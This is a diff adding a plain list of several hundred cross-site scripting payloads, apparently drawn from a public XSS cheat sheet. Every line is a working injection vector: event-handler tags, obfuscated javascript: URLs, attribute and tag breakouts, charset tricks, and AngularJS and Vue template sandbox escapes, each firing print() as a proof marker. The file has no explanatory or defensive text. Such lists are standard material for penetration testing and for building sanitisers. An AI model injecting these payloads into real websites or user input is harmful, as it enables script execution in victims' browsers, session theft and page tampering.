@@ -1,0 +1,1677 @@
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="print()"></xss>
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="print()"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="print()"></xss>
+<xss id=x onbeforematch=print() hidden=until-found>
+<svg><animate onbegin=print() attributeName=x dur=1s>
+<audio oncanplay=print()><source src="validaudio.wav" type="audio/wav"></audio>
+<video oncanplaythrough=print()><source src="validvideo.mp4" type="video/mp4"></video>
+<xss oncontentvisibilityautostatechange=print() style=display:block;content-visibility:auto>
+<input type=hidden oncontentvisibilityautostatechange=print() style=content-visibility:auto>
+<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=print() src="data:text/vtt,WEBVTT FILE 1 00:00:00.000 --> 00:00:05.000 <b>XSS</b> "></video>
+<audio controls ondurationchange=print()><source src=validaudio.mp3 type=audio/mpeg></audio>
+<svg><animate onend=print() attributeName=x dur=1s>
+<audio controls autoplay onended=print()><source src="validaudio.wav" type="audio/wav"></audio>
+<audio src/onerror=print()>
+<a id=x tabindex=1 onfocus=print()></a>
+<xss onfocus=print() autofocus tabindex=1>
+<a id=x tabindex=1 onfocusin=print()></a>
+<body onload=print()>
+<audio onloadeddata=print()><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onloadedmetadata=print()> <source src="validaudio.wav" type="audio/wav"></audio>
+<audio onloadstart="print()"><source>
+body <body onpagereveal=print()>
+<body onpageshow=print()>
+<audio autoplay onplay=print()><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onplaying=print()><source src="validaudio.wav" type="audio/wav"></audio>
+<audio controls onprogress=print()><source src=validaudio.mp3 type=audio/mpeg></audio>
+<svg><animate onrepeat=print() attributeName=x dur=1s repeatCount=2 />
+<body onscroll=print()><div style=height:1000px></div><div id=x></div>
+<xss onscrollend=print() style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br> <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br> <br><br><br><br><br><span id=x>test</span></xss>
+<address onscrollsnapchange=print() style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>
+<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample;animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class="scroll-container" onscrollsnapchanging="print()"> <xss class="scroll-item">Item 1</xss><xss class="scroll-item">Item 2</xss></xss>
+<xss onsecuritypolicyviolation=print()>XSS</xss>
+x<template shadowrootmode=open><slot onslotchange=print()>
+<audio controls onsuspend=print()><source src=validaudio.mp3 type=audio/mpeg></audio>
+audio <audio controls autoplay ontimeupdate=print()><source src="validaudio.wav" type="audio/wav"></audio>
+<details ontoggle=print() open>test</details>
+<xss autofocus style=transition:1s ontransitionend=print() tabindex=1>
+<style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=print()></xss>
+<body onunhandledrejection=print()><script>fetch('//xyz')</script>
+<geolocation onvalidationstatuschange=print()>
+<audio controls loop muted autoplay onwaiting=print()><source src=validaudio.mp3 type=audio/mpeg></audio>
+<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="print()"></xss>
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="print()"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="print()"></xss>
+<audio src=data:,%23EXTM3U%0A%23EXT-X-TARGETDURATION:1%0A%23EXT-X-KEY:METHOD=AES-128,URI=%22skd:%22%0A%23EXTINF:1%0Ax onwebkitneedkey=print()></audio>
+<audio onwebkitplaybacktargetavailabilitychanged=print()>
+<xss style=transition:1s onwebkittransitionend=print() tabindex=1 autofocus>
+<body onafterprint=print()>
+<input onauxclick=print()>
+<a onbeforecopy="print()" contenteditable>test</a>
+<a onbeforecut="print()" contenteditable>test</a>
+<xss contenteditable onbeforeinput=print()>test
+<xss onbeforepaste=print()>XSS</xss>
+<button popovertarget=x>Click me</button><xss onbeforetoggle=print() popover id=x>XSS</xss>
+<xss onblur=print() id=x tabindex=1 style=display:block>test</xss><input value=clickme>
+<input type=file oncancel=print()>
+<input onchange=print() value=xss>
+<xss onclick="print()" style=display:block>test</xss>
+<dialog open onclose=print()><form method=dialog><button>XSS</button></form>
+<button commandfor=test command=show-popover>Click<div id=test oncommand=print()>
+<xss oncontextmenu="print()" style=display:block>test</xss>
+<xss oncopy=print() value="XSS" autofocus tabindex=1 style=display:block>test
+custom tags <xss oncut=print() value="XSS" autofocus tabindex=1 style=display:block>test
+<xss ondblclick="print()" autofocus tabindex=1 style=display:block>test</xss>
+<xss draggable="true" ondrag="print()" style=display:block>test</xss>
+<xss draggable="true" ondragend="print()" style=display:block>test</xss>
+<xss draggable="true" ondragenter="print()" style=display:block>test</xss>
+<xss draggable="true" ondragexit="print()" style=display:block>test</xss>
+<xss draggable="true" ondragleave="print()" style=display:block>test</xss>
+<div draggable="true" contenteditable>drag me</div><xss ondragover=print() contenteditable style=display:block>drop here</xss>
+<xss draggable="true" ondragstart="print()" style=display:block>test</xss>
+<div draggable="true" contenteditable>drag me</div><xss ondrop=print() contenteditable style=display:block>drop here</xss>
+<xss onfocusout=print() autofocus tabindex=1 style=display:block>test</xss><input value=clickme>
+<form onformdata="print()"><button>Click</button></form>
+<video onfullscreenchange=print() src=validvideo.mp4 controls>
+<div ongesturechange=print()>XSS</div>
+<div ongestureend=print()>XSS</div>
+<div ongesturestart=print()>XSS</div>
+<input type=range ongotpointercapture=print()>
+<input oninput=print() value=xss>
+<form><input oninvalid=print() required><input type=submit>
+<xss onkeydown="print()" contenteditable style=display:block>test</xss>
+<xss onkeypress="print()" contenteditable style=display:block>test</xss>
+<xss onkeyup="print()" contenteditable style=display:block>test</xss>
+<geolocation autolocate onlocation=print()>
+<input type=range onlostpointercapture=print()>
+<xss onmousedown="print()" style=display:block>test</xss>
+<xss onmouseenter="print()" style=display:block>test</xss>
+<xss onmouseleave="print()" style=display:block>test</xss>
+<xss onmousemove="print()" style=display:block>test</xss>
+<xss onmouseout="print()" style=display:block>test</xss>
+<xss onmouseover="print()" style=display:block>test</xss>
+<xss onmouseup="print()" style=display:block>test</xss>
+<xss onmousewheel=print() style=display:block>requires scrolling
+<video onmozfullscreenchange=print() src=validvideo.mp4 controls>
+<a onpaste="print()" contenteditable>test</a>
+<audio autoplay controls onpause=print()><source src="validaudio.wav" type="audio/wav"></audio>
+<xss onpointercancel=print()>XSS</xss>
+<xss onpointerdown=print() style=display:block>XSS</xss>
+<xss onpointerenter=print() style=display:block>XSS</xss>
+<xss onpointerleave=print() style=display:block>XSS</xss>
+<xss onpointermove=print() style=display:block>XSS</xss>
+<xss onpointerout=print() style=display:block>XSS</xss>
+<xss onpointerover=print() style=display:block>XSS</xss>
+<xss onpointerrawupdate=print() style=display:block>XSS</xss>
+<xss onpointerup=print() style=display:block>XSS</xss>
+<geolocation onpromptaction=print()>
+<geolocation onpromptdismiss=print()>
+<audio controls autoplay onratechange=print()><source src="validaudio.wav" type="audio/wav"></audio>
+<form onreset=print()><input type=reset>
+<form><input type=search onsearch=print() value="Hit return" autofocus>
+<audio autoplay controls onseeked=print()><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay controls onseeking=print()><source src="validaudio.wav" type="audio/wav"></audio>
+<input onselect=print() value="XSS" autofocus>
+<body onselectionchange=print()>select some text
+<body onselectstart=print()>select some text
+<form onsubmit=print()><input type=submit>
+<button popovertarget=x>Click me</button><xss ontoggle=print() popover id=x>XSS</xss>
+<xss ontouchcancel=print()>XSS</xss>
+<body ontouchend=print()>
+<body ontouchmove=print()>
+<body ontouchstart=print()>
+<audio autoplay controls onvolumechange=print()><source src="validaudio.wav" type="audio/wav"></audio>
+<audio controls onwaiting=print()><source src=x type=x></audio>
+<video controls src=validvideo.mp4 onwebkitfullscreenchange=print()>
+<xss onwebkitmouseforcechanged=print()>XSS</xss>
+<xss onwebkitmouseforcedown=print()>XSS</xss>
+<xss onwebkitmouseforceup=print()>XSS</xss>
+<xss onwebkitmouseforcewillbegin=print()>XSS</xss>
+<video controls src=validvideo.mp4 onwebkitpresentationmodechanged=print()>
+<xss onwebkitwillrevealbottom=print()>XSS</xss>
+<body onwheel=print()>
+<noembed><img title="</noembed><img src onerror=print()>"></noembed>
+<noscript><img title="</noscript><img src onerror=print()>"></noscript>
+<style><img title="</style><img src onerror=print()>"></style>
+<script><img title="</script><img src onerror=print()>"></script>
+<iframe><img title="</iframe><img src onerror=print()>"></iframe>
+<xmp><img title="</xmp><img src onerror=print()>"></xmp>
+<textarea><img title="</textarea><img src onerror=print()>"></textarea>
+<noframes><img title="</noframes><img src onerror=print()>"></noframes>
+<title><img title="</title><img src onerror=print()>"></title>
+<script>eval(myUndefVar);var inject="INJECTION_STARTS_HERE";var myUndefVar;print();//";</script>
+<script>myUndefFunction(13,37);var inject="INJECTION_STARTS_HERE";function myUndefFunction(){};print();//";</script>
+<script>var myUndefObject = new myUndefClass();var inject="INJECTION_STARTS_HERE";function myUndefClass() {};print();//";</script>
+<script>$(document).ready(function(){var inject="INJECTION_STARTS_HERE";});function $(){return{ready:()=>0}};print();(function(){"";});</script>
+XSS Hoisting via parameter of an undefined accessor (object syntax) <script>undef01.undef02("INJECTION"+print());function undef01(){}//");</script>
+<script>undef01['undef02','INJECTION'+print()];function undef01(){};//'];</script>
+<script type="module">undef01.undef02.undef03.undef04.undef05();var inject = "INJECTION";import "data:text/jscript,print()"//";</script>
+<script>var x=atob("dXNlbGVzcyBjYWxsIG9mIG5hdGl2ZSBmdW5jdGlvbiAh");undef01.undef02();var inject ="INJECTION";function atob(){print();}//";</script>
+<svg onload=print()
+<svg onload=print()<!--
+<script>window.name='javascript:print()';</script><svg onload=location=name>
+<script>window.name='javascript:print()';function blah(){} blah(""+{a:location=name}+"")</script>
+<script>window.name='javascript:print()';function blah(){} blah(""+new class b{toString=e=>location=name}+"") </script>
+<svg onload=outerHTML=id id=<img/src/onerror=print()&gt;
+print()
+'-print()-'
+&apos;-print()-&apos;
+&#x27;-print()-&#x27;
+&#39;-print()-&#39;
+&#x27-print()-&#x27
+&#39-print()-&#39
+javaScript:print()
+java script:print()
+javascript&colon;print()
+javascript&#58;print()
+javascript&#x3a;print()
+javascript&#x3a-print()
+java&NewLine;script:print()
+javascript: URL via &Tab; entity (inline) (attribute_href) java&Tab;script:print()
+java&#x9;script:print()
+java&#x00000000000009;script:print()
+java&#9;script:print()
+java&#00000000000009;script:print()
+java&#x9script:print()
+java&#x00000000000009script:print()
+java&#9script:print()
+java&#00000000000009script:print()
+&NewLine;javascript:print()
+&Tab;javascript:print()
+javascript:print()
+%09javascript:print()
+%20javascript:print()
+&#1;javascript:print()
+&#2;javascript:print()
+&#3;javascript:print()
+&#4;javascript:print()
+&#5;javascript:print()
+&#6;javascript:print()
+&#7;javascript:print()
+&#8;javascript:print()
+&#9;javascript:print()
+&#10;javascript:print()
+&#11;javascript:print()
+&#12;javascript:print()
+&#13;javascript:print()
+&#14;javascript:print()
+&#15;javascript:print()
+&#16;javascript:print()
+&#17;javascript:print()
+&#18;javascript:print()
+&#19;javascript:print()
+&#20;javascript:print()
+&#21;javascript:print()
+&#22;javascript:print()
+&#23;javascript:print()
+&#24;javascript:print()
+&#25;javascript:print()
+&#26;javascript:print()
+&#27;javascript:print()
+&#28;javascript:print()
+&#29;javascript:print()
+&#30;javascript:print()
+&#31;javascript:print()
+&#x1;javascript:print()
+&#x2;javascript:print()
+&#x3;javascript:print()
+&#x4;javascript:print()
+&#x5;javascript:print()
+&#x6;javascript:print()
+&#x7;javascript:print()
+&#x8;javascript:print()
+javascript: URL via &#x9; entity (prefix, with ;) (attribute_href) &#x9;javascript:print()
+&#xa;javascript:print()
+&#xb;javascript:print()
+&#xc;javascript:print()
+&#xd;javascript:print()
+&#xe;javascript:print()
+&#xf;javascript:print()
+&#x10;javascript:print()
+&#x11;javascript:print()
+&#x12;javascript:print()
+&#x13;javascript:print()
+&#x14;javascript:print()
+&#x15;javascript:print()
+&#x16;javascript:print()
+&#x17;javascript:print()
+&#x18;javascript:print()
+&#x19;javascript:print()
+&#x1a;javascript:print()
+&#x1b;javascript:print()
+&#x1c;javascript:print()
+&#x1d;javascript:print()
+&#x1e;javascript:print()
+&#x1f;javascript:print()
+"/onfocus=print() tabindex=1 autofocus/
+"/onfocusin=print() tabindex=1 autofocus/
+"/onmousemove=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+"/onmouseenter=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+"/onpointerenter=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+"/onpointermove=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+"/onpointerover=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+"/onpointerrawupdate=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+"/onmousedown=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+"/onmouseup=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+"/onpointerdown=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+attribute break-out with onfocus (slash-sep) +autofocus (attribute_double) "/onfocus=print() autofocus/
+"/onfocusin=print() autofocus/
+1 onfocus=print() autofocus/
+1 onfocusin=print() autofocus/
+1 onmousemove=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onmouseenter=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onpointerenter=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onpointermove=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onpointerover=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onpointerrawupdate=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onmouseup=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+1 onpointerdown=print() style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /
+"onfocus="print()"/autofocus/
+"onfocusin="print()"/autofocus/
+"onmousemove="print()"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /
+"onmouseenter="print()"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /
+"onpointerenter="print()"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /
+"onpointermove="print()"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /
+"onpointerover="print()"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /
+"onpointerrawupdate="print()"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /
+"onmouseup="print()"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /
+"onpointerdown="print()"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /
+" srcdoc="<xss tabindex=1 autofocus onfocusin=print()>"
+<xss class=progress-bar-animated onanimationstart=print()>
+<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=print()><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>
+<iframe src="javascript:print()">
+<a href="javascript:print()">XSS</a>
+<a href="JaVaScript:print()">XSS</a>
+<a href=" javascript:print()">XSS</a>
+<a href="javas cript:print()">XSS</a>
+<a href="javascript :print()">XSS</a>
+<svg><a xlink:href="javascript:print()"><text x="20" y="20">XSS</text></a>
+<svg><animate xlink:href=#xss attributeName=href values=javascript:print() /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><animate xlink:href=#xss attributeName=href from=javascript:print() to=1 /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><set xlink:href=#x attributeName=href to=javascript:print() /><a id=x><text x=20 y=20>XSS</text></a>
+<script src="data:text/javascript,print()"></script>
+<svg><script href="data:text/javascript,print()" />
+<script>import('data:text/javascript,print()')</script>
+<math><x href="javascript:print()">blah
+<form><button formaction=javascript:print()>XSS
+<form><input type=submit formaction=javascript:print() value=XSS>
+<form action=javascript:print()><input type=submit value=XSS>
+<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:print()&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>
+<script>navigation.navigate('javascript:print()')</script>
+<iframe srcdoc="<img src=1 onerror=print()>"></iframe>
+<iframe srcdoc="&lt;img src=1 onerror=print()&gt;"></iframe>
+<form action="javascript:print()"><input type=submit id=x></form><label for=x>XSS</label>
+<input type="hidden" accesskey="X" onclick="print()"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+<link rel="canonical" accesskey="X" onclick="print()" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+<a href=# onclick="window.open('http://subdomain1.portswigger-labs.net/xss/xss.php? context=js_string_single&x=%27;eval(name)//','print()')">XSS</a>
+<iframe name="print()" src="https://portswigger-labs.net/xss/xss.php? context=js_string_single&x=%27;eval(name)//"></iframe>
+<base target="print()"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php? context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a>
+<a target="print()" href="http://subdomain1.portswigger-labs.net/xss/xss.php? context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a>
+<img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="print()" href="http://subdomain1.portswigger-labs.net/xss/xss.php? context=js_string_single&x=%27;eval(name)//"></map>
+<form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="print()"><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form>
+<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single> <input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="print()" value="XSS via formtarget in input type submit"></form>
+<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single> <input name=1 type="image" src="validimage.png" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="print()" value="XSS via formtarget in input type image"></form>
+<meta charset="UTF-7" /> +ADw-script+AD4-print()+ADw-/script+AD4-
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-print()+ADw-/script+AD4-
++/v8 +ADw-script+AD4-print()+ADw-/script+AD4-
++/v9 +ADw-script+AD4-print()+ADw-/script+AD4-
++/v+ +ADw-script+AD4-print()+ADw-/script+AD4-
++/v/ +ADw-script+AD4-print()+ADw-/script+AD4-
+%C0%BCscript>print()</script> %E0%80%BCscript>print()</script> %F0%80%80%BCscript>print()</script> %F8%80%80%80%BCscript>print()</script> %FC%80%80%80%80%BCscript>print()</script>
+<script>eval('\141lert(1)')</script> <script>eval('print()')</script> <script>eval('print()')</script>
+<a href="&#106;avascript:print()">XSS</a><a href="&#106avascript:print()">XSS</a>
+<svg><script>&#97;lert(1)</script></svg> <svg><script>&#x61;lert(1)</script></svg> <svg><script>alert&NewLine;(1) </script></svg> <svg><script>x="&quot;,print()//";</script></svg>
+<a href="&#0000106avascript:print()">XSS</a>
+<a href="&#x6a;avascript:print()">XSS</a>
+<a href="j&#x61vascript:print()">XSS</a> <a href="&#x6a avascript:print()">XSS</a> <a href="&#x6a avascript:print()">XSS</a>
+<a href="&#x0000006a;avascript:print()">XSS</a>
+<a href="&#X6A;avascript:print()">XSS</a>
+<a href="javascript&colon;print()">XSS</a> <a href="java&Tab;script:print()">XSS</a> <a href="java&NewLine;script:print()">XSS</a> <a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>
+<a href="javascript:x='%27-print()-%27';">XSS</a>
+<a href="javascript:x='&percnt;27-print()-%27';">XSS</a>
+{{constructor.constructor('print()')()}}
+<div v-html="''.constructor.constructor('print()')()">a</div>
+<x v-html=_c.constructor('print()')()>
+<x v-if=_c.constructor('print()')()>
+{{_c.constructor('print()')()}}
+{{_v.constructor('print()')()}}
+{{_s.constructor('print()')()}}
+<p v-show="_c.constructor`print()`()">
+<x v-on:click='_b.constructor`print()`()'>click</x>
+<x v-bind:a='_b.constructor`print()`()'>
+<x @[_b.constructor`print()`()]>
+<x :[_b.constructor`print()`()]>
+<p v-=_c.constructor`print()`()>
+<x #[_c.constructor`print()`()]>
+<p :=_c.constructor`print()`()>
+{{_b.constructor`print()`()}}
+<x @click='_b.constructor`print()`()'>click</x>
+<x title"="&lt;iframe&Tab;onload&Tab;=print()&gt;">
+<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/print()/.source)&gt;">
+<xyz<img/src onerror=print()>>
+<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/print()/.source)&gt;</noscript></b> </svg>
+<a @['c\lic\u{6b}']="_c.constructor('print()')()">test</a>
+{{$el.ownerDocument.defaultView.print()}}
+{{$el.innerHTML='\u003cimg src onerror=print()\u003e'}}
+<img src @error=e=$event.path.pop().print()>
+<img src @error=e=$event.composedPath().pop().print()>
+<img src @error=this.print()>
+<svg@load=this.print()>
+<p slot-scope="){}}])+this.constructor.constructor('print()')()})};//">
+{{_openBlock.constructor('print()')()}}
+{{_createBlock.constructor('print()')()}}
+{{_toDisplayString.constructor('print()')()}}
+{{_createVNode.constructor('print()')()}}
+<p v-show=_createBlock.constructor`print()`()>
+<x @[_openBlock.constructor`print()`()]>
+<x @[_capitalize.constructor`print()`()]>
+<x @click=_withCtx.constructor`print()`()>click</x>
+<x @click=$event.view.print()>click</x>
+{{_Vue.h.constructor`print()`()}}
+{{$emit.constructor`print()`()}}
+<component is=script text=print()>
+{{$on.constructor('print()')()}}
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'print()')()}}
+{{{}.")));print()//"}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'print()')()}}
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","print()"].sort(toString.constructor);}}
+{{!ready && (ready = true) && ( !call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply= constructor) && (valueOf = call) && (''+''.toString( 'F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'print();' )));}}
+{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=print()//');}}
+{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=print()//');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=print()');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };print()//');}}
+{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=print()');}}
+{{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync(" astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,print()))+'; astNode.argument={type:'Identifier',name:'foo'}; ");m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }}
+Jann Horn (Google) & Lukasz Plonka 326 {{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on;C=c.$apply(c);B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='print()';ast Node.argument={type:'Identifier'};");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}}
+constructor.constructor('print()')()
+a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'print()')()
+toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","print()"].sort(toString.constructor)
+{}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']] ['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={} [['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']] ['y'].value('print()')()
+{}.")));print()//";
+75 'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };print()//';
+{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=print()'
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+print()//'>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=print()//>
+javascript:/*--></title></style></textarea></script></xmp> <details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+print()//'>
+<img src="javascript:print()">
+<body background="javascript:print()">
+<iframe src="data:text/html,<img src=1 onerror=print()>">
+JScript compact was a minimal version of JS that wasn't widely used in IE <a href="#" onclick="jscript.compact:print();">test</a> <a href="#" onclick="JSCRIPT.COMPACT:print();">test</a>
+<a title="&{print()}">XSS</a>
+<div style=xss:expression(print())> <div style=xss:expression(1)-print()> <div style=xss:expressio\6e(print())> <div style=xss:expressio\006e(print())> <div style=xss:expressio\00006e(print())> <div style=xss:expressio\6e(print())> <div style=xss:expressio&#x5c;6e(print())>
+<div style=xss=expression(print())> <div style="color&#x3dred">test</div>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:print()">XSS</a>
+<script> function window.onload(){ print(); } </script> <script> function window::onload(){ print(); } </script> <script> function window.location(){ } </script> <body> <script> function/*<img src=1 onerror=print()>*/document.body.innerHTML(){} </script> </body> <body> <script> function document.body.innerHTML(){ x = "<img src=1 onerror=print()>"; } </script> </body>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=print()>"> </BODY> </HTML>
+<a href="javascript&#x6a;avascript:print()">Firefox</a>
+<a href="javascript&colon;print()">Firefox</a>
+<!-- ><img title="--><iframe/onload=print()>"> --> <!-- ><img title="--><iframe/onload=print()>"> -->
+Safari used to allow any tag to have a onload event inside SVG <svg><xss onload=print()>
+<isindex type=submit formaction=javascript:print()>
+<isindex type=submit action=javascript:print()>
+<svg><discard onbegin=print()>
+<img src=validimage.png onloadstart=print()>
+<input type=image onloadend=print() src=validimage.png>
+<marquee width=1 loop=1 onbounce=print()>XSS</marquee>
+<marquee width=1 loop=1 onfinish=print()>XSS</marquee>
+<marquee onstart=print()>XSS</marquee>
+<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=print()></menu></div>
+<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='print()' /&gt;&lt;/svg&gt;#x" />
+<base href="javascript:/a/-print()///////"><a href=../lol/safari.html>test</a>
+<object data="javascript:print()">
+<embed src="javascript:print()">
+<object data=# codebase=javascript:print()//>
+<embed src=# codebase=javascript:print()//>
+<object data="# print()" codebase=javascript://>
+<object data="#! print()" codebase=javascript:>
+<embed src="# print()" codebase=javascript://>
+<embed src="#! print()" codebase=javascript:>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:print()'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>
+<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='print()' /&gt;&lt;/svg&gt;#x" /><use id=x />
+<x onbeforescriptexecute=print()><script>1</script>
+<x onafterscriptexecute=print()><script>1</script>
+<svg onload=print()>
+"><svg onload=print()//
+"onmouseover=print()//
+"autofocus/onfocus=print()//
+'-print()//
+\'-print()//
+</script><svg onload=print()>
+<x contenteditable onblur=print()>lose focus!
+<x onclick=print()>click this!
+<x oncopy=print()>copy this!
+<x oncontextmenu=print()>right click this!
+<x oncut=print()>copy this!
+<x ondblclick=print()>double click this!
+<x ondrag=print()>drag this!
+<x contenteditable onfocus=print()>focus this!
+<x contenteditable oninput=print()>input here!
+<x contenteditable onkeydown=print()>press any key!
+<x contenteditable onkeypress=print()>press any key!
+<x contenteditable onkeyup=print()>press any key!
+<x onmousedown=print()>click this!
+<x onmousemove=print()>hover this!
+<x onmouseout=print()>hover this!
+<x onmouseover=print()>hover this!
+<x onmouseup=print()>click this!
+<x contenteditable onpaste=print()>paste here!
+<script>print()//
+<script>print()<!–
+%3Cx onxxx=print()
+<x onxxx=print() 1='
+'onload=print()><svg/1='
+'>print()</script><script/1='
+*/print()</script><script>/*
+*/print()">'onload="/*<svg/1='
+`-print()">'onload="`<svg/1='
+*/</script>'>print()/*<script/1='
+<script>print()</script>
+<script src=javascript:print()>
+<iframe src=javascript:print()>
+<embed src=javascript:print()>
+<a href=javascript:print()>click
